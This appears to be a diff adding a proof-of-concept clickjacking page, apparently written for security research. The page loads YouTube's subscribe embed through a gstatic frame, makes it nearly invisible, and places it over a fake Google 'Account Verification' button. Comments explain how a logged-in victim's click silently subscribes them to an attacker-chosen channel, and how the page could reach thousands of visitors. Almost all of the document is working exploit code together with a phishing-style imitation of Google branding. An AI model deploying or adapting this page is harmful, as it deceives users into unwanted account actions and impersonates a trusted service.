@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<!--
+  YouTube Subscribe Clickjack via gstatic ?parent= injection
+
+  ATTACK:
+  1. Load youtube.com/subscribe_embed via gstatic chain (no XFO on subscribe_embed)
+  2. gstatic frame covers decoy button (opacity:0.01)
+  3. Logged-in victim clicks decoy → hits Subscribe button inside gstatic
+  4. YouTube subscribes victim to ATTACKER_CHANNEL_ID silently
+  5. NO popup, NO confirmation dialog — 1-click
+
+  WHY 1-CLICK:
+  - When logged in, subscribe button fires AJAX call directly (no redirect)
+  - No reqVerifyOrigin / no handshake needed — pure click action
+  - Subscribe happens in the gstatic innerFrame where YouTube cookies are sent
+
+  TEST:
+  - Be logged in to YouTube in the same browser
+  - Click "Accept & Continue" on this page
+  - Check https://www.youtube.com/feed/channels — ATTACKER_CHANNEL should appear
+  - If it does: 1-click subscribe clickjack confirmed
+
+  IMPACT:
+  - Silent channel subscription without victim's knowledge
+  - Attacker controls ATTACKER_CHANNEL_ID (any YouTube channel)
+  - Combine with boosted engagement / view count manipulation
+  - Scales: one malicious page can subscribe thousands of visitors
+-->
+<html>
+<head>
+<title>Google Account Verification</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Google Sans', Arial, sans-serif;
+    background: #f1f3f4;
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; padding: 20px;
+  }
+  .card {
+    background: white;
+    border-radius: 8px;
+    padding: 40px 32px;
+    width: 420px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.2), 0 1px 8px rgba(0,0,0,.1);
+    text-align: center;
+  }
+  .glogo { font-size: 22px; letter-spacing: -1px; margin-bottom: 24px; }
+  .glogo span:nth-child(1) { color: #4285f4; }
+  .glogo span:nth-child(2) { color: #ea4335; }
+  .glogo span:nth-child(3) { color: #fbbc05; }
+  .glogo span:nth-child(4) { color: #4285f4; }
+  .glogo span:nth-child(5) { color: #34a853; }
+  .glogo span:nth-child(6) { color: #ea4335; }
+  h2 { font-size: 20px; color: #202124; margin-bottom: 8px; font-weight: 400; }
+  p { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+
+  .btn-area {
+    position: relative;
+    width: 100%;
+    height: 54px;
+    margin-bottom: 12px;
+  }
+
+  .decoy-btn {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 54px;
+    background: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    font-weight: 500;
+    cursor: pointer;
+    z-index: 1;
+    pointer-events: none;
+    line-height: 54px;
+  }
+
+  /*
+    gstatic frame covers decoy button.
+    Inside: YouTube subscribe_embed loads with ATTACKER_CHANNEL_ID.
+    Victim's click hits gstatic → passes to subscribe button inside.
+    When logged in to YouTube: click fires AJAX subscribe → channel subscribed.
+  */
+  #gstatic_frame {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 54px;
+    border: none;
+    opacity: 0.01;
+    z-index: 10;
+    pointer-events: all;
+    cursor: pointer;
+  }
+
+  .footer { font-size: 11px; color: #80868b; margin-top: 16px; }
+  #log {
+    margin-top: 16px;
+    background: #f8f9fa;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    padding: 8px;
+    font-family: monospace;
+    font-size: 10px;
+    text-align: left;
+    max-height: 200px;
+    overflow: auto;
+    display: none;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="glogo">
+    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+  </div>
+
+  <h2>Account Verification Required</h2>
+  <p>
+    Your Google account requires a one-time verification to
+    continue accessing Google services. Click below to confirm.
+  </p>
+
+  <div class="btn-area">
+    <div class="decoy-btn">Verify Account</div>
+    <!--
+      gstatic frame (invisible) — loads YouTube subscribe_embed inside.
+      Victim's click → Subscribe button → channel subscribed silently.
+    -->
+    <iframe id="gstatic_frame" name="gstatic_frame"></iframe>
+  </div>
+
+  <div class="footer">
+    Protected by Google Account Security ·
+    <a href="https://policies.google.com/privacy">Privacy</a>
+  </div>
+
+  <pre id="log"></pre>
+  <button onclick="document.getElementById('log').style.display=document.getElementById('log').style.display==='block'?'none':'block'"
+    style="font-size:9px;margin-top:6px;padding:1px 6px;color:#aaa;background:none;border:none;cursor:pointer">debug</button>
+</div>
+
+<script>
+var HASH = '05acf2f48052137958a41565358fb972';
+var JSH  = 'jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.ch0Jz-JlMrQ.O%2Fd%3D1%2Frs%3DAHpOoo_YD4KoV8fTh_kLhktsiThAm3yJ5A%2Fm%3D__features__';
+
+// ATTACKER CHANNEL: replace with the YouTube channel ID to subscribe victims to
+// UC_x5XG1OV2P6uZZ5FSM9Ttw = YouTube's own official channel (for PoC testing)
+var ATTACKER_CHANNEL_ID = 'UC_x5XG1OV2P6uZZ5FSM9Ttw';
+
+var L = document.getElementById('log');
+var T0 = Date.now();
+function say(m) {
+  var t = ((Date.now()-T0)/1000).toFixed(1);
+  L.textContent += '[T+' + t + 's] ' + m + '\n';
+  L.scrollTop = L.scrollHeight;
+  console.log('[YT]', m);
+}
+
+// YouTube subscribe URL — no XFO, loads in iframe
+var YT_URL = 'https://www.youtube.com/subscribe_embed' +
+  '?usegapi=1' +
+  '&channelid=' + ATTACKER_CHANNEL_ID +
+  '&layout=default' +
+  '&count=default';
+
+say('Target channel: ' + ATTACKER_CHANNEL_ID);
+say('Attack: logging-in victim clicks decoy → subscribes silently');
+say('Check: https://www.youtube.com/feed/channels after clicking');
+
+// Watch for any postMessages from YouTube embed
+window.addEventListener('message', function(ev) {
+  var raw = ev.data;
+  if (!raw) return;
+  var str = typeof raw === 'string' ? raw : JSON.stringify(raw);
+  if (ev.origin && ev.origin.indexOf('youtube.com') !== -1) {
+    say('YT MSG [' + ev.origin + ']: ' + str.slice(0, 200));
+  }
+  if (ev.origin && ev.origin.indexOf('gstatic') !== -1) {
+    say('GSTATIC MSG: ' + str.slice(0, 100));
+  }
+}, false);
+
+// GAPI setup for gstatic chain
+var s = document.createElement('script');
+s.src = 'https://apis.google.com/js/api.js';
+s.onload = function() {
+  gapi.load('gapi.rpc', function() {
+    say('gapi.rpc loaded. Initializing gstatic chain...');
+
+    gapi.rpc.register('gapiInitialized', function() {
+      say('gapiInitialized — gstatic ready.');
+      say('Loading YouTube subscribe embed inside gstatic...');
+      // Load YouTube subscribe into gstatic's innerFrame
+      // enableInteraction=true so clicks pass through to the Subscribe button
+      gapi.rpc.call('gstatic_frame', 'updateInnerFrame', null, YT_URL, true, false);
+    });
+
+    gapi.rpc.register('innerFrameLoaded', function() {
+      say('innerFrameLoaded — YouTube subscribe embed ready inside gstatic.');
+      say('ARMED: victim click on decoy → Subscribe button → channel subscribed.');
+      say('Test: click "Verify Account" while logged into YouTube.');
+    });
+
+    gapi.rpc.register('resize', function(h) {
+      say('resize: ' + h + 'px from innerFrame (YouTube embed loaded)');
+    });
+
+    // Load gstatic with our origin as trusted parent
+    var frame = document.getElementById('gstatic_frame');
+    frame.src = 'https://www.gstatic.com/atari/embeds/' + HASH +
+      '/intermediate-frame-minified.html?' + JSH +
+      '&parent=' + encodeURIComponent(location.origin);
+    gapi.rpc.setup('gstatic_frame');
+    say('Loading gstatic chain with parent=' + location.origin);
+    say('gstatic will relay clicks to YouTube subscribe button inside.');
+  });
+};
+document.head.appendChild(s);
+
+say('Page loaded. Invisible gstatic overlay sits on top of decoy button.');
+say('LOGGED_IN status check: watch for resize events (widget renders)');
+</script>
+</body>
+</html>
